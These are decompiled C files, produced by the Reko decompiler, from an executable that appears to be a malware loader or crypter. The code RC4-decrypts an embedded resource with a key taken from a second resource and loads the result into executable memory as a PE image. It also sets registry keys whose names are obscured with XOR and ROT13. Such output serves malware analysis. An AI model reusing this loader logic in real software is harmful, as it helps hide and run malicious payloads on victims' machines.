// subject_data.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

struct Eq_587 * g_ptr403008 = null; // 00403008
struct Eq_347 * g_ptr40300C = null; // 0040300C
Eq_12 g_t403010 = // 00403010
	{
		null
	};
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__RegSetValueExA = &g_t23B6; // 00402000
<anonymous> * __imp__RegCloseKey = &g_t23C8; // 00402004
<anonymous> * __imp__RegCreateKeyExA = &g_t23A4; // 00402008
<anonymous> * __imp__LockResource = &g_t231E; // 00402010
<anonymous> * __imp__SizeofResource = &g_t232E; // 00402014
<anonymous> * __imp__GetModuleFileNameA = &g_t2340; // 00402018
<anonymous> * __imp__LoadResource = &g_t230E; // 0040201C
<anonymous> * __imp__Sleep = &g_t2368; // 00402020
<anonymous> * __imp__ExitProcess = &g_t2370; // 00402024
<anonymous> * __imp__FindResourceA = &g_t22FE; // 00402028
<anonymous> * __imp__VirtualProtect = &g_t22EC; // 0040202C
<anonymous> * __imp__GetProcAddress = &g_t2356; // 00402030
<anonymous> * __imp__GetModuleHandleA = &g_t22D8; // 00402034
<anonymous> * __imp__wsprintfA = &g_t238C; // 0040203C
Eq_1136 g_a402060[4] = // 00402060
	{
		
		{
			
			{
				
				{
					0x4A, 0x00, 0x00, 0x00, 0xE4, 0x23, 0x00, 0x00, 0xE4, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
				}
			},
			
			{
				
				{
					0xE4, 0x23, 0x00, 0x00, 0xE4, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE1, 0xC5, 0xD4, 0xC0, 
				}
			},
			
			{
				
				{
					0xE4, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE1, 0xC5, 0xD4, 0xC0, 0xCD, 0xC9, 0xC2, 0xD5, 
				}
			},
			0x00,
		},
		
		{
			
			{
				
				{
					0xE1, 0xC5, 0xD4, 0xC0, 0xCD, 0xC9, 0xC2, 0xD5, 0xFB, 0xFB, 0xFD, 0xD1, 0xD7, 0xC2, 0xC5, 0xC1, 
				}
			},
			
			{
				
				{
					0xCD, 0xC9, 0xC2, 0xD5, 0xFB, 0xFB, 0xFD, 0xD1, 0xD7, 0xC2, 0xC5, 0xC1, 0xC5, 0xD4, 0xC0, 0xFB, 
				}
			},
			
			{
				
				{
					0xFB, 0xFB, 0xFD, 0xD1, 0xD7, 0xC2, 0xC5, 0xC1, 0xC5, 0xD4, 0xC0, 0xFB, 0xFB, 0xED, 0xD1, 0xC6, 
				}
			},
			0xC1C5C2D7,
		},
		
		{
			
			{
				
				{
					0xC5, 0xD4, 0xC0, 0xFB, 0xFB, 0xED, 0xD1, 0xC6, 0xD6, 0xC5, 0xCD, 0xC1, 0xFB, 0xFB, 0xF7, 0xCF, 
				}
			},
			
			{
				
				{
					0xFB, 0xED, 0xD1, 0xC6, 0xD6, 0xC5, 0xCD, 0xC1, 0xFB, 0xFB, 0xF7, 0xCF, 0xC2, 0xC2, 0xD5, 0xC6, 
				}
			},
			
			{
				
				{
					0xD6, 0xC5, 0xCD, 0xC1, 0xFB, 0xFB, 0xF7, 0xCF, 0xC2, 0xC2, 0xD5, 0xC6, 0xC0, 0xEE, 0xD5, 0xC2, 
				}
			},
			~0x30080404,
		},
		
		{
			
			{
				
				{
					0xC2, 0xC2, 0xD5, 0xC6, 0xC0, 0xEE, 0xD5, 0xC2, 0xC1, 0xD1, 0xC5, 0xC6, 0xFB, 0xFB, 0xF1, 0xC6, 
				}
			},
			
			{
				
				{
					0xC0, 0xEE, 0xD5, 0xC2, 0xC1, 0xD1, 0xC5, 0xC6, 0xFB, 0xFB, 0xF1, 0xC6, 0xC0, 0xD5, 0xC2, 0xC6, 
				}
			},
			
			{
				
				{
					0xC1, 0xD1, 0xC5, 0xC6, 0xFB, 0xFB, 0xF1, 0xC6, 0xC0, 0xD5, 0xC2, 0xC6, 0xD5, 0xC0, 0x00, 0x00, 
				}
			},
			3337747451,
		},
	};
Eq_126 g_t4020C0 = // 004020C0
	{
		
		{
			0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 
		}
	};
Eq_129 g_t4020D0 = // 004020D0
	{
		
		{
			0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 
		}
	};
byte g_b402100 = 0x41; // 00402100
byte g_b402120 = 0x61; // 00402120
word128 g_ow402140 = // 00402140
	{
		0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 
	};
Eq_28 g_t402230 = // 00402230
	{
		
		{
		},
		0x00,
		0x00,
	};
word32 g_dw402294 = 0x23B6; // 00402294
word32 g_dw402298 = 0x23C8; // 00402298
word32 g_dw40229C = 0x23A4; // 0040229C
word32 g_dw4022A4 = 8990; // 004022A4
word32 g_dw4022A8 = 0x232E; // 004022A8
word32 g_dw4022AC = 0x2340; // 004022AC
word32 g_dw4022B0 = 0x230E; // 004022B0
word32 g_dw4022B4 = 0x2368; // 004022B4
word32 g_dw4022B8 = 0x2370; // 004022B8
word32 g_dw4022BC = 0x22FE; // 004022BC
word32 g_dw4022C0 = 0x22EC; // 004022C0
word32 g_dw4022C4 = 0x2356; // 004022C4
word32 g_dw4022C8 = 0x22D8; // 004022C8
word32 g_dw4022D0 = 9100; // 004022D0
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	ptr32 fp;
	Eq_4 tLoc0578;
	Eq_2 tLoc040C;
	__align_stack<word32>(fp - 4);
	Eq_12 eax_11 = GetModuleHandleA(0x00);
	Eq_18 edi_14 = eax_11.u0[60];
	int32 edx_15 = (word32) *((word32) edi_14 + ((word32) eax_11 + 6));
	struct Eq_28 * ebx_16 = eax_11.u0 + ((word32) edi_14 + 0x00F8);
	if (edx_15 > 0x00)
	{
		int32 esi_29 = 0x00;
		while (fn004018F0(ebx_16, &g_t402230, 0x06) != 0x00)
		{
			++esi_29;
			++ebx_16;
			if (esi_29 >= edx_15)
				break;
		}
	}
	VirtualProtect(eax_11, 0x1000, 0x04, &tLoc040C);
	Mem82[eax_11 + 0x88 + edi_14:word32] = Mem77[ebx_16 + 0x0C:word32];
	Mem86[eax_11 + 0x8C + edi_14:word32] = Mem84[ebx_16 + 8:word32];
	Eq_58 eax_87 = FindResourceA(eax_11, 311, 0x00402240);
	Eq_12 eax_98 = LockResource(LoadResource(eax_11, eax_87));
	Eq_2 eax_105 = SizeofResource(eax_11, eax_87);
	Eq_58 eax_114 = FindResourceA(0x00, 0x0138, 0x00402240);
	Eq_2 eax_121 = SizeofResource(0x00, eax_114);
	Eq_12 eax_132 = LockResource(LoadResource(0x00, eax_114));
	fn00401550();
	GetModuleFileNameA(0x00, &tLoc0578, 0x0104);
	ptr32 esp_153 = fp - 0x0844;
	Eq_126 xmm1_154 = g_t4020C0.u0;
	Eq_129 xmm0_155 = g_t4020D0.u0;
	uint32 eax_156;
	for (eax_156 = 0x00; eax_156 < 0x0100; eax_156 += 0x10)
	{
		(fp - 0x0404)[eax_156].t0000.u0 = (word128) xmm0_155;
		Eq_129 xmm0_167 = __simd_add<word32[4]>(xmm0_155, xmm1_154);
		(fp - 1012)[eax_156].t0000.u0 = (word128) xmm0_167;
		Eq_129 xmm0_171 = __simd_add<word32[4]>(xmm0_167, xmm1_154);
		(fp - 996)[eax_156].t0000.u0 = (word128) xmm0_171;
		Eq_129 xmm0_175 = __simd_add<word32[4]>(xmm0_171, xmm1_154);
		(fp - 0x03D4)[eax_156].t0000.u0 = (word128) xmm0_175;
		xmm0_155 = __simd_add<word32[4]>(xmm0_175, xmm1_154);
	}
	ui32 ecx_189 = 0x00;
	int32 esi_193;
	for (esi_193 = 0x00; esi_193 < 0x0100; ++esi_193)
	{
		word32 ebx_197 = (fp - 0x0404)[esi_193];
		ui32 ecx_209 = ecx_189 + ebx_197 + (word32) (eax_132.u0)[(uint32) ((uint64) esi_193 % eax_121)];
		byte bl_228 = (byte) ebx_197;
		ecx_189 = ecx_209 & 0x800000FF;
		if ((ecx_209 & 0x800000FF) < 0x00)
			ecx_189 = ((ecx_209 & 0x800000FF) - 0x01 | ~0xFF) + 0x01;
		(fp - 0x0404)[esi_193] = (fp - 0x0404)[ecx_189];
		(fp - 0x0404)[ecx_189] = (word32) bl_228;
	}
	int32 edx_236 = esi_193;
	if (eax_105 > 0x00)
	{
		Eq_2 esi_239 = 0x00;
		Eq_12 edi_243 = eax_98;
		do
		{
			int32 edx_245 = edx_236 + 0x01;
			edx_236 = edx_245 & 0x800000FF;
			if ((edx_245 & 0x800000FF) < 0x00)
				edx_236 = ((edx_245 & 0x800000FF) - 0x01 | ~0xFF) + 0x01;
			word32 ebx_262 = (fp - 0x0404)[edx_236];
			ui32 ecx_265 = ecx_189 + ebx_262;
			byte bl_288 = (byte) ebx_262;
			ecx_189 = ecx_265 & 0x800000FF;
			if ((ecx_265 & 0x800000FF) < 0x00)
				ecx_189 = ((ecx_265 & 0x800000FF) - 0x01 | ~0xFF) + 0x01;
			(fp - 0x0404)[edx_236] = (fp - 0x0404)[ecx_189];
			word32 eax_286 = (word32) edi_243.u0->b0000;
			word32 ebx_289 = (word32) bl_288;
			(fp - 0x0404)[ecx_189] = ebx_289;
			ui32 ebx_291 = ebx_289 + (fp - 0x0404)[edx_236];
			ui32 ebx_292 = ebx_291 & 0x800000FF;
			if ((ebx_291 & 0x800000FF) < 0x00)
				ebx_292 = ((ebx_291 & 0x800000FF) - 0x01 | ~0xFF) + 0x01;
			edi_243.u0->b0000 = (byte) eax_286 ^ ((fp - 0x0404))[ebx_292].b0000;
			++edi_243;
			esi_239 = (word32) esi_239 + 1;
		} while (esi_239 < eax_105);
	}
	g_t403010.u0 = (struct Eq_1162 *) eax_98;
	if ((word32) *eax_98 == 23117)
	{
		word32 eax_336 = Mem331[eax_98 + 60:word32] + eax_98;
		g_ptr40300C = eax_336;
		if (eax_336->dw0000 == 0x4550)
		{
			Eq_359 eax_348 = GetProcAddress(GetModuleHandleA(4202884), 4202900);
			Eq_359 eax_359 = GetProcAddress(GetModuleHandleA(0x004021A4), 0x004021B0);
			Eq_359 eax_370 = GetProcAddress(GetModuleHandleA(4202884), 4202952);
			Eq_359 eax_381 = GetProcAddress(GetModuleHandleA(4202884), 0x004021D8);
			Eq_359 eax_392 = GetProcAddress(GetModuleHandleA(4202884), 4202988);
			Eq_359 eax_403 = GetProcAddress(GetModuleHandleA(4202884), 0x00402200);
			Eq_359 eax_414 = GetProcAddress(GetModuleHandleA(4202884), 0x00402214);
			eax_348();
			struct Eq_347 * eax_468 = g_ptr40300C;
			struct Eq_446 * esp_475;
			null();
			struct Eq_347 * eax_481 = g_ptr40300C;
			esp_475->dwFFFFFFFC = 0x40;
			esp_475->dwFFFFFFF8 = 0x3000;
			esp_475->dwFFFFFFF4 = eax_481->dw0050;
			esp_475->dwFFFFFFF0 = eax_481->dw0034;
			esp_475->dwFFFFFFEC = *(word32 *) 0x0428;
			struct Eq_475 * esp_495;
			(*(<anonymous> **) 0x0424)();
			struct Eq_347 * eax_501 = g_ptr40300C;
			esp_495->dwFFFFFFFC = 0x00;
			esp_495->dwFFFFFFF8 = eax_501->dw0054;
			esp_495->tFFFFFFF4.u0 = (struct Eq_1162 *) eax_98;
			esp_495->dwFFFFFFF0 = eax_501->dw0034;
			esp_495->dwFFFFFFEC = esp_495->dw0428;
			word32 ecx_518;
			struct Eq_506 * esp_515;
			esp_495->ptr041C();
			struct Eq_347 * eax_521 = g_ptr40300C;
			Eq_359 esi_405 = eax_403;
			Eq_359 edi_416 = eax_414;
			int32 edx_522 = (word32) eax_521->w0006;
			if (edx_522 > 0x00)
			{
				esp_515->t0414 = eax_414;
				<anonymous> * edi_529 = esp_515->ptr041C;
				esp_515->t0418 = eax_403;
				int32 esi_535 = 0x00;
				do
				{
					Eq_12 ecx_537 = g_t403010.u0;
					struct Eq_580 * esp_539 = esp_515 - 4;
					esp_539->dw0000 = 0x00;
					struct Eq_587 * edx_546 = eax_98.u0 + ((word32) ((ecx_537.u0))[60].dw003C + 188) + esi_535 * 0x28;
					esp_539->dwFFFFFFFC = edx_546->dw0010;
					word32 ecx_552 = edx_546->dw000C + eax_521->dw0034;
					word32 eax_553 = edx_546->dw0014;
					g_ptr403008 = edx_546;
					word32 eax_555 = eax_98.u0 + eax_553;
					esp_539->dwFFFFFFF8 = eax_555;
					esp_539->dwFFFFFFF4 = ecx_552;
					esp_539->dwFFFFFFF0 = esp_539->dw042C;
					edi_529();
					eax_521 = g_ptr40300C;
					++esi_535;
				} while (esi_535 < (word32) eax_521->w0006);
				edi_416 = esp_515->t0414;
				esi_405 = esp_515->t0418;
			}
			struct Eq_521 * esp_582 = esp_515 - 4;
			esp_582->ptr0000 = esp_515;
			esp_582->dwFFFFFFFC = esp_582->dw0430;
			struct Eq_533 * esp_589;
			esp_582->ptr0424();
			struct Eq_347 * eax_595 = g_ptr40300C;
			word32 edx_597 = eax_595->dw0034 + eax_595->dw0028;
			esp_589->dw00B0 = edx_597;
			esp_589->ptrFFFFFFFC = esp_515;
			esp_589->dwFFFFFFF8 = esp_589->dw042C;
			struct Eq_559 * esp_606;
			esi_405();
			esp_606->dwFFFFFFFC = esp_606->dw042C;
			edi_416();
		}
	}
	union Eq_2 * esp_623 = esp_153 - 4;
	esp_623->u0 = 15000;
	Sleep(esp_623->u0);
	esp_623->u0 = 0x00;
	ExitProcess(esp_623->u0);
}

// 004014BC: void fn004014BC(Register Eq_15 edx)
// Called from:
//      fn00401550
void fn004014BC(Eq_15 edx)
{
	Eq_4 tLoc98;
	Eq_675 tLoc18;
	Eq_676 tLoc14;
	Eq_2 tLoc10;
	wsprintfA(&tLoc98, 0x00402150, 0x00);
	if (RegCreateKeyExA((struct HKEY__ *) 0x80000001, &tLoc98, 0x00, null, 0x00, 0x000F003F, null, &tLoc14, &tLoc10) == 0x00)
	{
		tLoc18 = (Eq_675) 0x00;
		RegSetValueExA(tLoc14, edx, 0x00, 0x04, &tLoc18, 0x04);
		RegCloseKey(tLoc14);
	}
}

// 00401550: void fn00401550()
// Called from:
//      Win32CrtStartup
void fn00401550()
{
	Eq_739 fp;
	Eq_4 tLoc0644;
	__align_stack<word32>(fp - 4);
	Eq_745 eax_13;
	for (eax_13 = 0x30; eax_13 != 0x00; eax_13 -= 0x10)
	{
		Mem22[fp - 0x88 + eax_13:word32] = Mem19[eax_13 + 4202604:word32];
		Mem24[fp - 0x8C + eax_13:word32] = Mem22[eax_13 + 4202600:word32];
		Mem26[fp - 0x90 + eax_13:word32] = Mem24[eax_13 + 0x00402064:word32];
		Mem28[fp - 0x94 + eax_13:word32] = Mem26[eax_13 + 0x00402060:word32];
	}
	word128 xmm0_43 = g_ow402140;
	Eq_782 eax_44;
	for (eax_44 = 0x00; eax_44 < 0x30; eax_44 += 0x10)
		Mem54[fp - 0x84 + eax_44:word128] = __pxor<word128>(Mem50[fp - 0x84 + eax_44:word128], xmm0_43);
	wsprintfA(&tLoc0644, 4202840, 0x00);
	int32 eax_143 = (int32) tLoc0644;
	Eq_815 ecx_245 = fp - 0x0130;
	if (eax_143 != 0x00)
	{
		CHAR * ebx_114 = &tLoc0644;
		do
		{
			byte al_236;
			++ebx_114;
			byte bLoc24_426 = g_b402120;
			int32 edi_137 = (int32) g_b402100;
			Eq_854 esi_138 = fp - 0x44;
			if (edi_137 != 0x00)
			{
				do
				{
					if (edi_137 == eax_143)
						goto l004018D8;
					esi_138.u0 = (word32) esi_138 + 1;
					edi_137 = (int32) *esi_138.u0;
				} while (edi_137 != 0x00);
				if (edi_137 == eax_143)
					goto l0040176F;
				goto l00401797;
			}
			if (edi_137 != eax_143)
			{
l00401797:
				al_236 = (byte) eax_143;
				int32 edx_170 = (int32) bLoc24_426;
				Eq_871 esi_171 = fp - 0x24;
				if (edx_170 != 0x00)
				{
					do
					{
						al_236 = (byte) eax_143;
						if (edx_170 == eax_143)
							goto l004018C2;
						++esi_171;
						edx_170 = (int32) *esi_171.u0;
					} while (edx_170 != 0x00);
					if (edx_170 == eax_143)
						goto l004017C2;
				}
				else if (edx_170 == eax_143)
				{
l004018C2:
					if (esi_171 != 0x00)
					{
l004017C2:
						Eq_934 esi_205 = esi_171 - (fp - 0x24);
						al_236 = Mem136[esi_205 + 0x0D - ((SLICE((esi_205 + 0x0D) *s64 0x4EC4EC4F, word32, 32) >> 0x03) - (esi_205 + 0x0D >> 0x1F)) *s 0x1A + (fp - 0x24):byte];
					}
				}
				goto l004017E8;
			}
l004018D8:
			if (esi_138 == 0x00)
				goto l00401797;
l0040176F:
			word32 esi_223 = esi_138 - (fp - 0x44);
			al_236 = (fp - (byte *) 0x44).u0[esi_223 + 0x0D - ((SLICE((esi_223 + 0x0D) *s64 0x4EC4EC4F, word32, 32) >> 0x03) - (esi_223 + 0x0D >> 0x1F)) *s 0x1A];
l004017E8:
			*ecx_245.u0 = al_236;
			eax_143 = (int32) *ebx_114;
			++ecx_245;
		} while (eax_143 != 0x00);
	}
	*ecx_245.u0 = 0x00;
	fn004014BC(4202848);
	fn004014BC(4202860);
	fn004014BC(4202848);
	fn004014BC(4202848);
	fn004014BC(4202860);
	fn004014BC(4202848);
	fn004014BC(4202860);
	fn004014BC(4202848);
}

// 004018F0: Register word32 fn004018F0(Stack (ptr32 Eq_28) dwArg04, Stack (ptr32 Eq_28) dwArg08, Stack uint32 dwArg0C)
// Called from:
//      Win32CrtStartup
word32 fn004018F0(struct Eq_28 * dwArg04, struct Eq_28 * dwArg08, uint32 dwArg0C)
{
	if (dwArg04 != dwArg08 && dwArg0C != 0x00)
	{
		if (dwArg0C >> 0x02 > 0x00)
		{
			uint32 ebx_101 = 0x00;
			do
			{
				if (dwArg04[ebx_101 * 0x04 / 40] != dwArg08[(ebx_101 * 0x04) / 40])
				{
					int32 eax_41 = (word32) dwArg04[ebx_101 * 0x04 / 40];
					int32 ecx_42 = (word32) dwArg08[ebx_101 * 0x04 / 40];
					if (eax_41 != ecx_42)
					{
						word32 eax_207 = 0x01;
						if (eax_41 <= ecx_42)
							eax_207 = ~0x00;
						return eax_207;
					}
					int32 eax_45 = (word32) dwArg04->a0000[ebx_101].b0001;
					int32 ecx_46 = (word32) dwArg08->a0000[ebx_101].b0001;
					if (eax_45 != ecx_46)
					{
						word32 eax_208 = 0x01;
						if (eax_45 <= ecx_46)
							eax_208 = ~0x00;
						return eax_208;
					}
					int32 eax_49 = (word32) dwArg04->a0000[ebx_101].b0002;
					int32 ecx_50 = (word32) dwArg08->a0000[ebx_101].b0002;
					if (eax_49 == ecx_50)
					{
						word32 eax_210 = 0x01;
						if ((word32) dwArg04->a0000[ebx_101].b0003 <= (word32) ((dwArg08->a0000))[ebx_101].b0003)
							eax_210 = ~0x00;
						return eax_210;
					}
					else
					{
						word32 eax_209 = 0x01;
						if (eax_49 <= ecx_50)
							eax_209 = ~0x00;
						return eax_209;
					}
				}
				++ebx_101;
			} while (ebx_101 < dwArg0C >> 0x02);
		}
		int32 ebx_107 = dwArg04 + ((dwArg0C >> 0x02) * 0x04) / 40;
		int32 edx_109 = dwArg08 + ((dwArg0C >> 0x02) * 0x04) / 40;
		if ((dwArg0C & 0x03) != 0x00)
		{
			byte eax_116[] = null;
			do
			{
				if ((word32) eax_116[ebx_107] != (word32) eax_116[edx_109])
				{
					word32 eax_130 = 0x01;
					if ((word32) eax_116[ebx_107] <= (word32) eax_116[edx_109])
						eax_130 = ~0x00;
					return eax_130;
				}
				eax_116 = (byte (*)[]) (eax_116 + 1);
			} while (eax_116 < (dwArg0C & 0x03));
		}
	}
	return 0x00;
}

